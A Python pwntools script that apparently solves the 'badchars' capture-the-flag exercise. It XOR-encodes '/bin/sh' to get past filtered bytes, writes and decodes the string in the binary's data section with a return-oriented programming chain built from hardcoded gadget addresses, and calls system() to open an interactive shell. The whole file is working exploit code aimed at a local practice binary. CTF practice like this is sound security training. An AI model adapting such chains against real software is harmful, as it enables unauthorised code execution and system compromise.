from pwn import *

binary = "./badchars"
elf = ELF(binary)
p = process(binary)

bad_chars = [0x62, 0x69, 0x2f, 0x20, 0x66, 0x63, 0x73]

def xor(data, key):
	length = len(data)
	align = length % 8
	if align != 0:
		data += (8 - align) * "\x00"
		length = len(data)

	return ''.join(chr(ord(i)^key) for i in data)

def ropchain(pop_gadget_addr, target_addr, target_string, mov_gadget_addr):
	length = len(target_string)
	align = length % 8
	ropc = ''
	if align != 0:
		target_string += (8 - align) * "\x00"
		length = len(target_string)
	
	for i in range(0 , length, 8):
		ropc += p64(pop_gadget_addr)
		ropc += target_string[i:i+8]
		ropc += p64(target_addr + i)
		ropc += p64(mov_gadget_addr)

	return ropc

def decode_xor(pop_gadget_addr, key, target_addr, xor_gadget_addr, encoded_string):
	length = len(encoded_string)
	ropc = ''
	for i in range(length):
		ropc += p64(pop_gadget_addr)
		ropc += p64(key)
		ropc += p64(target_addr + i)
		ropc += p64(xor_gadget_addr)

	return ropc

data_addr = 0x601070+0x10
xor_gadget_addr = 0x400b30
pop_gadget_addr = 0x400b39
pop_pop_gadget_addr_1 = 0x400b40
pop_pop_gadget_addr_2 = 0x400b3b
mov_gadget_addr = 0x400b34
plt_system = elf.symbols["system"]
target_string = "/bin/sh"
key = 0x21

encoded_string = xor(target_string, key)
padding = 'A' * 40
payload = padding
payload += ropchain(pop_pop_gadget_addr_2, data_addr, encoded_string, mov_gadget_addr)
payload += decode_xor(pop_pop_gadget_addr_1, key, data_addr, xor_gadget_addr, encoded_string)
payload += p64(pop_gadget_addr)
payload += p64(data_addr)
payload += p64(plt_system)

p.sendline(payload)
p.interactive()
p.close()

		








































